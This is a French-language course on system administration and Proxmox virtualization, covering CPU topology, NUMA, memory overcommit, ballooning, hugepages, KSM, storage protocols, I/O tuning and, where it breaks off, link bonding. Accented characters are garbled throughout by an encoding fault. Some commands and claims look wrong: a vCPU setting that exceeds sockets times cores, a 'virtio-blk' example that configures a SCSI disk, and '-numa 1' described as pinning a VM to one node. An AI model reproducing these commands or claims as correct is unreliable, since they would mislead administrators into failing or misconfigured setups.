# Cours Complet : Administration SystÃ¨me, Virtualisation et RÃ©seaux
## De DÃ©butant Ã  Expert

---

**Auteur :** Guide de Formation Technique  
**Niveau :** DÃ©butant Ã  Expert  
**DurÃ©e estimÃ©e :** 40-60 heures d'apprentissage  

---

## Table des MatiÃ¨res

### Introduction et Objectifs
- [PrÃ©sentation du cours](#prÃ©sentation-du-cours)
- [PrÃ©requis et progression](#prÃ©requis-et-progression)
- [Comment utiliser ce guide](#comment-utiliser-ce-guide)

### Module 1 : Bases Hardware
- [1.1 Architecture CPU : Sockets, Cores, Threads](#11-architecture-cpu)
- [1.2 Gestion de la RAM](#12-gestion-de-la-ram)
- [1.3 Stockage et I/O](#13-stockage-et-io)
- [1.4 RÃ©seau physique](#14-rÃ©seau-physique)

### Module 2 : Virtualisation
- [2.1 Concepts fondamentaux](#21-concepts-fondamentaux)
- [2.2 Hyperviseurs Type 1 vs Type 2](#22-hyperviseurs)
- [2.3 CPU virtuel et NUMA](#23-cpu-virtuel-et-numa)
- [2.4 Virtualisation imbriquÃ©e](#24-virtualisation-imbriquÃ©e)

### Module 3 : RÃ©seau Virtuel
- [3.1 Bridges et commutateurs virtuels](#31-bridges-et-commutateurs-virtuels)
- [3.2 VLAN et segmentation](#32-vlan-et-segmentation)
- [3.3 vNIC et virtio](#33-vnic-et-virtio)
- [3.4 Bonding et agrÃ©gation](#34-bonding-et-agrÃ©gation)

### Module 4 : Stockage
- [4.1 Stockage local vs distribuÃ©](#41-stockage-local-vs-distribuÃ©)
- [4.2 LVM et LVM-Thin](#42-lvm-et-lvm-thin)
- [4.3 ZFS](#43-zfs)
- [4.4 Ceph et stockage distribuÃ©](#44-ceph-et-stockage-distribuÃ©)

### Module 5 : Haute DisponibilitÃ© et Clustering
- [5.1 Concepts de clustering](#51-concepts-de-clustering)
- [5.2 Data plane vs Control plane](#52-data-plane-vs-control-plane)
- [5.3 Proxmox clustering](#53-proxmox-clustering)
- [5.4 Migration et failover](#54-migration-et-failover)

### Module 6 : Cas d'Usage DevOps
- [6.1 Infrastructure as Code](#61-infrastructure-as-code)
- [6.2 CI/CD avec virtualisation](#62-cicd-avec-virtualisation)
- [6.3 Kubernetes et conteneurs](#63-kubernetes-et-conteneurs)
- [6.4 Microservices et orchestration](#64-microservices-et-orchestration)

### Module 7 : Cas d'Usage CybersÃ©curitÃ©
- [7.1 Laboratoires Red Team](#71-laboratoires-red-team)
- [7.2 Segmentation rÃ©seau](#72-segmentation-rÃ©seau)
- [7.3 DMZ et bastions](#73-dmz-et-bastions)
- [7.4 Isolation et sandboxing](#74-isolation-et-sandboxing)

### Annexes
- [Glossaire](#glossaire)
- [FAQ](#faq)
- [Feuille de route d'apprentissage](#feuille-de-route-dapprentissage)
- [RÃ©fÃ©rences et ressources](#rÃ©fÃ©rences-et-ressources)

---

## PrÃ©sentation du cours

### Objectifs pÃ©dagogiques

Ce cours vous accompagne dans la maÃ®trise complÃ¨te de l'administration systÃ¨me moderne, de la virtualisation et des rÃ©seaux. Vous apprendrez Ã  :

- **Comprendre** l'architecture hardware et sa relation avec la virtualisation
- **MaÃ®triser** les concepts de clustering et haute disponibilitÃ©
- **Configurer** des infrastructures rÃ©seau complexes avec VLAN et SDN
- **GÃ©rer** diffÃ©rents types de stockage (local, distribuÃ©, software-defined)
- **ImplÃ©menter** des solutions DevOps et de cybersÃ©curitÃ©
- **Optimiser** les performances et la sÃ©curitÃ© de vos infrastructures

### Approche pÃ©dagogique

**Progression par analogies** : Chaque concept complexe est expliquÃ© avec des analogies du quotidien (un bridge rÃ©seau = une multiprise intelligente, un hyperviseur = un chef d'orchestre, etc.).

**Exemples concrets** : Chaque notion thÃ©orique est immÃ©diatement illustrÃ©e par des cas d'usage rÃ©els en dÃ©veloppement, opÃ©rations et cybersÃ©curitÃ©.

**SchÃ©mas visuels** : Des diagrammes ASCII intÃ©grÃ©s pour visualiser les architectures et flux de donnÃ©es.

**Pratique immÃ©diate** : Des commandes prÃªtes Ã  utiliser et des exercices progressifs.

---

## PrÃ©requis et progression

### Niveau requis
- **DÃ©butant** : Notions de base Linux/Windows, utilisation du terminal
- **IntermÃ©diaire** : ComprÃ©hension des rÃ©seaux TCP/IP, expÃ©rience basique VM

### Progression recommandÃ©e
1. **Semaines 1-2** : Modules 1-2 (bases hardware et virtualisation)
2. **Semaines 3-4** : Modules 3-4 (rÃ©seau et stockage)
3. **Semaines 5-6** : Modules 5-7 (clustering et cas d'usage)
4. **Semaine 7** : RÃ©visions et projets pratiques

### Environnement de test
Pour suivre ce cours efficacement, vous aurez besoin de :
- **Machine physique** : 16 GB RAM minimum, CPU avec support virtualisation
- **Proxmox VE** : Installation sur machine dÃ©diÃ©e ou VM (nested virtualization)
- **AccÃ¨s rÃ©seau** : Pour tÃ©lÃ©charger ISO et packages

---

## Comment utiliser ce guide

### Structure des modules
Chaque module suit cette organisation :
1. **Introduction** : Contexte et objectifs
2. **Concepts thÃ©oriques** : DÃ©finitions et explications
3. **SchÃ©mas et diagrammes** : Visualisation des architectures
4. **Exemples pratiques** : Commandes et configurations
5. **Cas d'usage** : Applications concrÃ¨tes
6. **Quiz** : 5 questions pour valider la comprÃ©hension
7. **Bonnes pratiques** : Check-list des recommandations
8. **RÃ©fÃ©rences** : Documentation officielle et ressources

### Conventions utilisÃ©es

```bash
# Commandes Ã  exÃ©cuter (copier-coller)
pvesm status
```

> **ğŸ’¡ Astuce** : Conseils et bonnes pratiques

> **âš ï¸ Attention** : Points critiques et piÃ¨ges Ã  Ã©viter

> **ğŸ”§ Pratique** : Exercices hands-on

**Terme technique** : DÃ©finition ou explication

---

*Ce guide est conÃ§u pour Ãªtre votre rÃ©fÃ©rence complÃ¨te. N'hÃ©sitez pas Ã  revenir sur les sections prÃ©cÃ©dentes et Ã  adapter le rythme Ã  votre niveau.*



---

# Module 1 : Bases Hardware

## 1.1 Architecture CPU : Sockets, Cores, Threads

### Introduction aux processeurs modernes

L'architecture des processeurs modernes constitue le fondement de toute infrastructure virtualisÃ©e. Pour comprendre comment optimiser vos machines virtuelles et conteneurs, il est essentiel de maÃ®triser la hiÃ©rarchie CPU : socket â†’ core â†’ thread. Cette comprÃ©hension vous permettra d'Ã©viter les erreurs courantes de sur-allocation et d'optimiser les performances de vos charges de travail.

Un **socket** reprÃ©sente l'emplacement physique oÃ¹ se connecte un processeur sur la carte mÃ¨re. Dans un serveur moderne, vous pouvez avoir 1, 2, 4 ou mÃªme 8 sockets. Chaque socket contient un processeur complet avec ses propres caches, contrÃ´leurs mÃ©moire et liens d'interconnexion.

Imaginez un socket comme un **chef d'Ã©quipe** dans une cuisine professionnelle. Chaque chef (socket) supervise plusieurs cuisiniers (cores) qui peuvent chacun gÃ©rer plusieurs tÃ¢ches simultanÃ©ment (threads). Plus vous avez de chefs, plus vous pouvez traiter de commandes en parallÃ¨le, mais la coordination devient plus complexe.

### Architecture dÃ©taillÃ©e : Socket â†’ Core â†’ Thread

```
Serveur physique
â”œâ”€â”€ Socket 0 (CPU 0)
â”‚   â”œâ”€â”€ Core 0
â”‚   â”‚   â”œâ”€â”€ Thread 0 (vCPU 0)
â”‚   â”‚   â””â”€â”€ Thread 1 (vCPU 1)
â”‚   â”œâ”€â”€ Core 1
â”‚   â”‚   â”œâ”€â”€ Thread 2 (vCPU 2)
â”‚   â”‚   â””â”€â”€ Thread 3 (vCPU 3)
â”‚   â””â”€â”€ Cache L3 partagÃ©
â”œâ”€â”€ Socket 1 (CPU 1)
â”‚   â”œâ”€â”€ Core 0
â”‚   â”‚   â”œâ”€â”€ Thread 4 (vCPU 4)
â”‚   â”‚   â””â”€â”€ Thread 5 (vCPU 5)
â”‚   â””â”€â”€ Cache L3 partagÃ©
â””â”€â”€ Interconnexion (QPI/UPI)
```

Un **core** (cÅ“ur) est une unitÃ© de traitement indÃ©pendante capable d'exÃ©cuter des instructions. Les processeurs modernes intÃ¨grent gÃ©nÃ©ralement entre 4 et 64 cores par socket. Chaque core possÃ¨de ses propres caches L1 et L2, mais partage le cache L3 avec les autres cores du mÃªme socket.

Un **thread** (fil d'exÃ©cution) reprÃ©sente la capacitÃ© d'un core Ã  traiter plusieurs flux d'instructions simultanÃ©ment grÃ¢ce Ã  l'Hyper-Threading (Intel) ou SMT (AMD). Un core peut gÃ©nÃ©ralement gÃ©rer 2 threads, doublant ainsi le nombre de vCPU disponibles pour la virtualisation.

### Impact sur la virtualisation

Lorsque vous crÃ©ez une machine virtuelle, vous lui attribuez des **vCPU** (CPU virtuels). La rÃ¨gle fondamentale est qu'un vCPU correspond Ã  un thread physique. Cependant, la topologie que vous choisissez impacte directement les performances :

**Configuration optimale pour une VM 8 vCPU :**
- âœ… **RecommandÃ©** : 1 socket, 4 cores, 2 threads = topologie cohÃ©rente
- âŒ **Ã€ Ã©viter** : 8 sockets, 1 core, 1 thread = overhead de communication

```bash
# Proxmox : Configuration CPU optimale pour VM
qm set 100 -sockets 1 -cores 4 -vcpus 8
# RÃ©sultat : 1 socket Ã— 4 cores Ã— 2 threads = 8 vCPU
```

### NUMA : Non-Uniform Memory Access

NUMA reprÃ©sente l'architecture mÃ©moire des serveurs multi-socket modernes. Chaque socket possÃ¨de sa propre banque de mÃ©moire RAM directement connectÃ©e. L'accÃ¨s Ã  la mÃ©moire "locale" (mÃªme socket) est plus rapide que l'accÃ¨s Ã  la mÃ©moire "distante" (autre socket).

```
Architecture NUMA 2 sockets :

Socket 0                    Socket 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ CPU 0           â”‚â—„â”€â”€â”€â”€â”€â”€â–ºâ”‚ CPU 1           â”‚
â”‚ â”œâ”€ 8 cores      â”‚  QPI   â”‚ â”œâ”€ 8 cores      â”‚
â”‚ â””â”€ Cache L3     â”‚        â”‚ â””â”€ Cache L3     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ RAM 64 GB       â”‚        â”‚ RAM 64 GB       â”‚
â”‚ (Local)         â”‚        â”‚ (Local)         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      â–²                              â–²
      â”‚ AccÃ¨s rapide                 â”‚ AccÃ¨s rapide
      â”‚ (100 ns)                     â”‚ (100 ns)
      â”‚                              â”‚
      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         AccÃ¨s distant (150 ns)
```

**Impact pratique :** Une VM configurÃ©e sur 2 sockets NUMA diffÃ©rents subira une pÃ©nalitÃ© de performance de 20-30% due aux accÃ¨s mÃ©moire distants. Proxmox gÃ¨re automatiquement l'affinitÃ© NUMA, mais vous pouvez l'optimiser manuellement.

```bash
# VÃ©rifier la topologie NUMA
numactl --hardware

# Forcer une VM sur un nÅ“ud NUMA spÃ©cifique
qm set 100 -numa 1
```

### Exemples concrets et bonnes pratiques

**Cas d'usage 1 : Serveur de base de donnÃ©es**
Pour une base de donnÃ©es critique nÃ©cessitant 16 vCPU, privilÃ©giez une configuration 1 socket Ã— 8 cores Ã— 2 threads plutÃ´t que 2 sockets Ã— 4 cores Ã— 2 threads. Cela Ã©vite les latences NUMA et optimise l'accÃ¨s aux caches partagÃ©s.

**Cas d'usage 2 : Cluster Kubernetes**
Pour des nÅ“uds Kubernetes, limitez chaque VM Ã  un seul socket NUMA. Cela simplifie la gestion des ressources par le scheduler Kubernetes et amÃ©liore la prÃ©visibilitÃ© des performances.

**Cas d'usage 3 : Laboratoire Red Team**
Dans un environnement de test de pÃ©nÃ©tration, vous pouvez sur-allouer les vCPU (ratio 4:1 ou 8:1) car les outils de sÃ©curitÃ© sont rarement CPU-intensifs. Une machine physique 16 cores peut supporter 64-128 vCPU rÃ©partis sur plusieurs VM de test.

### Commandes de diagnostic et optimisation

```bash
# Afficher la topologie CPU complÃ¨te
lscpu

# VÃ©rifier l'utilisation par core
mpstat -P ALL 1

# Proxmox : Lister les VM et leur allocation CPU
qm list

# Proxmox : Modifier la topologie d'une VM
qm set <vmid> -sockets 2 -cores 4 -vcpus 16

# VÃ©rifier l'affinitÃ© NUMA d'un processus
cat /proc/<pid>/numa_maps
```

---

## 1.2 Gestion de la RAM

### Concepts fondamentaux de la mÃ©moire virtuelle

La gestion de la RAM dans un environnement virtualisÃ© implique plusieurs couches d'abstraction qui peuvent sembler complexes au premier abord. Imaginez la mÃ©moire comme un **systÃ¨me de bibliothÃ¨que Ã  plusieurs niveaux** : la RAM physique est l'espace de stockage rÃ©el, la mÃ©moire virtuelle est le catalogue qui rÃ©fÃ©rence tous les livres disponibles (mÃªme ceux stockÃ©s ailleurs), et l'hyperviseur agit comme le bibliothÃ©caire qui optimise l'utilisation de l'espace.

Dans un systÃ¨me non-virtualisÃ©, chaque application accÃ¨de directement Ã  la mÃ©moire physique via le systÃ¨me d'exploitation. Avec la virtualisation, nous ajoutons une couche supplÃ©mentaire : l'hyperviseur doit gÃ©rer la mÃ©moire pour plusieurs systÃ¨mes d'exploitation invitÃ©s simultanÃ©ment, chacun pensant avoir accÃ¨s exclusif Ã  toute la RAM.

### Architecture de la mÃ©moire virtualisÃ©e

```
Application
    â†“
MÃ©moire virtuelle invitÃ©e (Guest Virtual Memory)
    â†“
MÃ©moire physique invitÃ©e (Guest Physical Memory)
    â†“
MÃ©moire virtuelle hÃ´te (Host Virtual Memory)
    â†“
MÃ©moire physique hÃ´te (Host Physical Memory)
```

Cette architecture Ã  quatre niveaux permet une flexibilitÃ© extraordinaire mais introduit aussi des dÃ©fis de performance. L'hyperviseur doit maintenir des tables de correspondance entre la mÃ©moire que voit chaque VM et la mÃ©moire physique rÃ©elle du serveur.

### Memory Overcommit : Principe et risques

L'**overcommit** mÃ©moire consiste Ã  allouer plus de RAM virtuelle aux VM que la quantitÃ© physiquement disponible sur l'hÃ´te. Cette technique repose sur l'observation que la plupart des applications n'utilisent pas simultanÃ©ment toute leur mÃ©moire allouÃ©e.

**Exemple concret :** Votre serveur physique dispose de 64 GB de RAM. Vous pouvez crÃ©er 4 VM de 32 GB chacune (128 GB total allouÃ©) si vous savez que chaque VM n'utilise rÃ©ellement que 12-16 GB en moyenne.

```
Serveur physique : 64 GB RAM
â”œâ”€â”€ VM1 : 32 GB allouÃ© â†’ 12 GB utilisÃ©
â”œâ”€â”€ VM2 : 32 GB allouÃ© â†’ 16 GB utilisÃ©  
â”œâ”€â”€ VM3 : 32 GB allouÃ© â†’ 14 GB utilisÃ©
â””â”€â”€ VM4 : 32 GB allouÃ© â†’ 10 GB utilisÃ©
Total allouÃ© : 128 GB
Total utilisÃ© : 52 GB (< 64 GB physique) âœ…
```

**Risques de l'overcommit :**
- **Memory pressure** : Si toutes les VM utilisent simultanÃ©ment leur allocation maximale
- **Performance dÃ©gradÃ©e** : Activation du swap, ralentissement gÃ©nÃ©ral
- **OOM Killer** : Terminaison forcÃ©e de processus en cas de manque critique

### Ballooning : Gestion dynamique de la mÃ©moire

Le **ballooning** est une technique Ã©lÃ©gante qui permet Ã  l'hyperviseur de rÃ©cupÃ©rer dynamiquement de la mÃ©moire inutilisÃ©e des VM. Un driver spÃ©cial (balloon driver) s'exÃ©cute dans chaque VM invitÃ©e et peut "gonfler" ou "dÃ©gonfler" selon les besoins de l'hÃ´te.

**Analogie :** Imaginez des ballons gonflables dans des boÃ®tes (VM). Quand une boÃ®te a besoin de plus d'espace, l'hyperviseur peut dÃ©gonfler les ballons des autres boÃ®tes pour libÃ©rer de la place.

```
Ã‰tat initial :
VM1 [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘] 8/10 GB utilisÃ©s
VM2 [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘] 6/10 GB utilisÃ©s  
VM3 [â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘] 4/10 GB utilisÃ©s

VM1 a besoin de plus de mÃ©moire :
VM1 [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 10/10 GB utilisÃ©s
VM2 [â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘] 4/8 GB (balloon +2GB)
VM3 [â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 2/6 GB (balloon +2GB)
```

**Configuration du ballooning dans Proxmox :**

```bash
# Activer le ballooning pour une VM
qm set 100 -balloon 1024  # Minimum 1GB garanti

# VÃ©rifier l'Ã©tat du ballooning
qm monitor 100
info balloon
```

### Hugepages : Optimisation pour les charges critiques

Les **hugepages** remplacent les pages mÃ©moire standard de 4 KB par des pages de 2 MB ou 1 GB. Cette technique rÃ©duit drastiquement la pression sur le TLB (Translation Lookaside Buffer) et amÃ©liore les performances pour les applications manipulant de gros volumes de donnÃ©es.

**Cas d'usage typiques :**
- **Bases de donnÃ©es** : Oracle, PostgreSQL avec de gros buffer pools
- **Applications HPC** : Calcul scientifique, simulations
- **NFV** : Fonctions rÃ©seau virtualisÃ©es nÃ©cessitant des performances dÃ©terministes

```bash
# Configuration des hugepages sur l'hÃ´te
echo 1024 > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages

# VÃ©rification
cat /proc/meminfo | grep Huge

# Proxmox : Activer hugepages pour une VM
qm set 100 -hugepages 2  # Pages de 2MB
```

**Impact performance :** Les hugepages peuvent amÃ©liorer les performances de 10-30% pour les applications intensives en mÃ©moire, au prix d'une flexibilitÃ© rÃ©duite dans l'allocation mÃ©moire.

### KSM : Kernel Same-page Merging

KSM est une technologie de dÃ©duplication mÃ©moire qui identifie et fusionne les pages identiques entre diffÃ©rentes VM. Cette technique est particuliÃ¨rement efficace quand vous exÃ©cutez plusieurs VM avec le mÃªme systÃ¨me d'exploitation.

**Exemple concret :** 10 VM Ubuntu identiques partagent de nombreuses pages systÃ¨me communes. KSM peut rÃ©duire l'utilisation mÃ©moire de 20-40% en fusionnant ces pages redondantes.

```bash
# Activer KSM sur l'hÃ´te Proxmox
echo 1 > /sys/kernel/mm/ksm/run

# Configurer la frÃ©quence de scan
echo 100 > /sys/kernel/mm/ksm/sleep_millisecs

# VÃ©rifier les statistiques KSM
cat /sys/kernel/mm/ksm/pages_shared
cat /sys/kernel/mm/ksm/pages_sharing
```

### StratÃ©gies de dimensionnement mÃ©moire

**RÃ¨gle du 80/20 :** Dimensionnez votre infrastructure pour que l'utilisation mÃ©moire reste sous 80% en fonctionnement normal. Les 20% restants servent de buffer pour les pics de charge et les opÃ©rations de maintenance.

**Calcul d'overcommit sÃ©curisÃ© :**
```
RAM physique : 128 GB
RAM rÃ©servÃ©e hÃ´te : 16 GB (12.5%)
RAM disponible VM : 112 GB
Ratio overcommit : 1.5x
RAM total allouable : 168 GB
```

**Monitoring et alertes :**

```bash
# Script de monitoring mÃ©moire
#!/bin/bash
TOTAL_RAM=$(free -g | awk 'NR==2{print $2}')
USED_RAM=$(free -g | awk 'NR==2{print $3}')
USAGE_PERCENT=$((USED_RAM * 100 / TOTAL_RAM))

if [ $USAGE_PERCENT -gt 80 ]; then
    echo "ALERT: Memory usage at ${USAGE_PERCENT}%"
    # DÃ©clencher ballooning ou migration
fi
```

### Cas d'usage spÃ©cialisÃ©s

**Laboratoire de cybersÃ©curitÃ© :** Dans un environnement Red Team, vous pouvez agressivement sur-allouer la mÃ©moire (ratio 3:1 ou 4:1) car les outils de test sont gÃ©nÃ©ralement lÃ©gers. Utilisez KSM pour optimiser les VM similaires et le ballooning pour gÃ©rer les pics ponctuels.

**Infrastructure de dÃ©veloppement :** Pour des environnements CI/CD, configurez des hugepages pour les bases de donnÃ©es de test et utilisez l'overcommit modÃ©rÃ© (1.5x) pour maximiser le nombre d'environnements parallÃ¨les.

**Production critique :** DÃ©sactivez l'overcommit, rÃ©servez 20% de mÃ©moire pour l'hÃ´te, et utilisez des hugepages pour les applications critiques. Configurez des alertes strictes et des procÃ©dures de migration automatique.

---

## 1.3 Stockage et I/O

### Architecture du stockage moderne

Le stockage dans un environnement virtualisÃ© moderne ressemble Ã  un **systÃ¨me postal complexe** avec plusieurs niveaux de tri et d'acheminement. Les donnÃ©es partent de l'application, traversent le systÃ¨me de fichiers de la VM, passent par l'hyperviseur, puis atteignent finalement le stockage physique. Chaque Ã©tape ajoute de la latence mais aussi des possibilitÃ©s d'optimisation.

L'Ã©volution du stockage a suivi une progression claire : des disques mÃ©caniques locaux vers des solutions software-defined distribuÃ©es, en passant par les SAN traditionnels. Cette Ã©volution rÃ©pond aux besoins croissants de performance, de disponibilitÃ© et de scalabilitÃ© des infrastructures modernes.

### HiÃ©rarchie des performances de stockage

```
Performance (IOPS) et Latence :

NVMe SSD (local)     : 500,000+ IOPS, <0.1ms
â”œâ”€â”€ IdÃ©al pour : Bases de donnÃ©es, logs
â””â”€â”€ Limitation : Pas de redondance

SATA SSD (local)     : 50,000 IOPS, 0.1-0.5ms  
â”œâ”€â”€ IdÃ©al pour : SystÃ¨mes d'exploitation
â””â”€â”€ Bon compromis prix/performance

NVMe over Fabric     : 200,000+ IOPS, 0.2-0.5ms
â”œâ”€â”€ IdÃ©al pour : Stockage partagÃ© haute perf
â””â”€â”€ ComplexitÃ© rÃ©seau Ã©levÃ©e

iSCSI SSD           : 20,000 IOPS, 0.5-2ms
â”œâ”€â”€ IdÃ©al pour : Stockage partagÃ© standard
â””â”€â”€ DÃ©pendant du rÃ©seau

Ceph (SSD)          : 10,000 IOPS, 1-5ms
â”œâ”€â”€ IdÃ©al pour : Stockage distribuÃ©
â””â”€â”€ Overhead de rÃ©plication

HDD (7200 RPM)      : 150 IOPS, 8-15ms
â”œâ”€â”€ IdÃ©al pour : Archivage, backup
â””â”€â”€ Performance limitÃ©e
```

### Types de stockage et cas d'usage

**Stockage local** reprÃ©sente la solution la plus simple et performante pour des cas d'usage spÃ©cifiques. Chaque nÅ“ud possÃ¨de ses propres disques, offrant des performances maximales mais sans redondance ni migration Ã  chaud.

**Avantages du stockage local :**
- Performance maximale (accÃ¨s direct)
- SimplicitÃ© de configuration
- CoÃ»t rÃ©duit (pas d'infrastructure rÃ©seau)
- Latence prÃ©visible

**InconvÃ©nients :**
- Pas de migration Ã  chaud des VM
- Point de dÃ©faillance unique
- Gestion complexe des sauvegardes

**Stockage partagÃ©** permet la migration Ã  chaud, la haute disponibilitÃ© et la gestion centralisÃ©e, au prix d'une complexitÃ© et d'un coÃ»t accrus.

### Protocoles de stockage rÃ©seau

**iSCSI (Internet Small Computer Systems Interface)** encapsule les commandes SCSI dans des paquets TCP/IP, permettant d'utiliser l'infrastructure Ethernet existante pour le stockage.

```bash
# Configuration iSCSI sur Proxmox
# 1. Installer les outils iSCSI
apt install open-iscsi

# 2. DÃ©couvrir les cibles disponibles
iscsiadm -m discovery -t st -p 192.168.1.100

# 3. Se connecter Ã  une cible
iscsiadm -m node -T iqn.2024-01.com.example:storage1 -p 192.168.1.100 --login

# 4. Ajouter le stockage dans Proxmox
pvesm add iscsi storage-iscsi --portal 192.168.1.100 --target iqn.2024-01.com.example:storage1
```

**NFS (Network File System)** offre une approche plus simple avec partage au niveau fichier plutÃ´t que bloc.

```bash
# Configuration NFS sur Proxmox
pvesm add nfs storage-nfs --server 192.168.1.200 --export /srv/proxmox --content images,vztmpl,backup
```

**Ceph RBD** fournit un stockage distribuÃ© avec rÃ©plication automatique et auto-rÃ©paration.

### Optimisation des performances I/O

**Queue Depth** reprÃ©sente le nombre d'opÃ©rations I/O en attente simultanÃ©ment. L'optimisation de ce paramÃ¨tre est cruciale pour maximiser les performances, particuliÃ¨rement avec les SSD NVMe.

```bash
# VÃ©rifier la queue depth actuelle
cat /sys/block/sda/queue/nr_requests

# Optimiser pour SSD NVMe
echo 32 > /sys/block/nvme0n1/queue/nr_requests

# Configuration permanente dans /etc/udev/rules.d/60-ioschedulers.rules
ACTION=="add|change", KERNEL=="nvme[0-9]*", ATTR{queue/scheduler}="none"
ACTION=="add|change", KERNEL=="sd[a-z]", ATTR{queue/rotational}=="0", ATTR{queue/scheduler}="mq-deadline"
```

**I/O Scheduler** dÃ©termine l'ordre de traitement des requÃªtes I/O. Le choix optimal dÃ©pend du type de stockage :

- **none** : Pour NVMe SSD (pas de rÃ©organisation nÃ©cessaire)
- **mq-deadline** : Pour SATA SSD (optimise les accÃ¨s sÃ©quentiels)
- **bfq** : Pour HDD (Ã©quitÃ© entre processus)

**Virtio-blk vs Virtio-scsi** : Deux drivers de stockage virtualisÃ© avec des caractÃ©ristiques diffÃ©rentes.

```bash
# Configuration Virtio-blk (performance maximale)
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=writeback,discard=on

# Configuration Virtio-scsi (fonctionnalitÃ©s avancÃ©es)
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=writeback,discard=on,iothread=1
```

### Cache et Write-back strategies

Le cache de stockage peut dramatiquement amÃ©liorer les performances, mais introduit des risques de perte de donnÃ©es en cas de panne.

**Modes de cache disponibles :**

```
writethrough : SÃ©curisÃ© mais lent
â”œâ”€â”€ Ã‰crit simultanÃ©ment cache et stockage
â””â”€â”€ Aucun risque de perte de donnÃ©es

writeback : Rapide mais risquÃ©  
â”œâ”€â”€ Ã‰crit d'abord en cache
â”œâ”€â”€ Synchronise pÃ©riodiquement
â””â”€â”€ Risque de perte si panne

none : Pas de cache
â”œâ”€â”€ Performance native du stockage
â””â”€â”€ RecommandÃ© pour stockage partagÃ©
```

**Configuration optimale par cas d'usage :**

```bash
# Base de donnÃ©es critique (sÃ©curitÃ© maximale)
qm set 100 -scsi0 storage:vm-100-disk-0,cache=writethrough

# Serveur web (performance/sÃ©curitÃ© Ã©quilibrÃ©e)  
qm set 100 -scsi0 storage:vm-100-disk-0,cache=writeback

# Stockage partagÃ© (Ã©viter double cache)
qm set 100 -scsi0 ceph:vm-100-disk-0,cache=none
```

### Monitoring et diagnostic des performances

**Outils de monitoring I/O :**

```bash
# iostat : Statistiques dÃ©taillÃ©es par device
iostat -x 1

# iotop : Processus consommant le plus d'I/O
iotop -o

# fio : Benchmark de performance
fio --name=random-write --ioengine=libaio --rw=randwrite --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting

# Proxmox : Monitoring via API
pvesh get /nodes/proxmox/storage/local-lvm/status
```

**MÃ©triques clÃ©s Ã  surveiller :**
- **IOPS** : OpÃ©rations par seconde
- **Latence** : Temps de rÃ©ponse moyen
- **Queue depth** : Profondeur de file d'attente
- **Utilisation** : Pourcentage d'occupation

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure DevOps :** Utilisez du stockage local NVMe pour les nÅ“uds de build CI/CD, avec rÃ©plication des artefacts sur stockage partagÃ©. Configurez des caches writeback agressifs pour maximiser les performances de compilation.

**Laboratoire Red Team :** PrivilÃ©giez la rapiditÃ© de dÃ©ploiement avec des templates sur stockage local, et utilisez des snapshots frÃ©quents pour revenir rapidement Ã  un Ã©tat propre entre les tests.

**Production critique :** ImplÃ©mentez une stratÃ©gie de stockage hybride : stockage local pour les logs et donnÃ©es temporaires, stockage partagÃ© pour les donnÃ©es critiques avec rÃ©plication synchrone.

---

## 1.4 RÃ©seau Physique

### Fondamentaux de l'infrastructure rÃ©seau

L'infrastructure rÃ©seau physique constitue la colonne vertÃ©brale de toute architecture virtualisÃ©e moderne. Contrairement Ã  un rÃ©seau traditionnel oÃ¹ chaque serveur possÃ¨de une ou deux interfaces rÃ©seau, un environnement virtualisÃ© multiplie exponentiellement les flux rÃ©seau. Un seul serveur physique peut hÃ©berger des dizaines de machines virtuelles, chacune avec ses propres interfaces rÃ©seau virtuelles, crÃ©ant un dÃ©fi complexe de gestion et d'optimisation.

Imaginez le rÃ©seau physique comme le **systÃ¨me autoroutier d'une mÃ©tropole**. Les interfaces physiques sont les autoroutes principales, les VLAN sont les voies spÃ©cialisÃ©es (bus, vÃ©hicules lÃ©gers, poids lourds), et les bridges virtuels sont les Ã©changeurs qui permettent aux diffÃ©rents flux de se croiser sans se mÃ©langer.

### Architecture rÃ©seau multicouche

```
Couche Application (VM/Conteneurs)
    â†“
Couche Virtualisation (vNIC, bridges)
    â†“  
Couche Hyperviseur (OVS, Linux Bridge)
    â†“
Couche Physique (NIC, Switch, Routeur)
    â†“
Couche Transport (Ethernet, IP, TCP/UDP)
```

Cette architecture multicouche permet une flexibilitÃ© extraordinaire mais nÃ©cessite une comprÃ©hension approfondie des interactions entre chaque niveau. Un paquet rÃ©seau Ã©mis par une application dans une VM traverse potentiellement 6-8 couches d'abstraction avant d'atteindre le rÃ©seau physique.

### Interfaces rÃ©seau et bonding

**Bonding** (ou agrÃ©gation de liens) combine plusieurs interfaces physiques en une seule interface logique, offrant redondance et/ou augmentation de bande passante. Cette technique est essentielle dans un environnement de production pour Ã©viter les points de dÃ©faillance unique.

**Modes de bonding principaux :**

```
Mode 0 (balance-rr) : Round-robin
â”œâ”€â”€ RÃ©partition Ã©quitable des paquets
â”œâ”€â”€ Bande passante cumulÃ©e
â””â”€â”€ NÃ©cessite switch compatible

Mode 1 (active-backup) : Actif/Passif
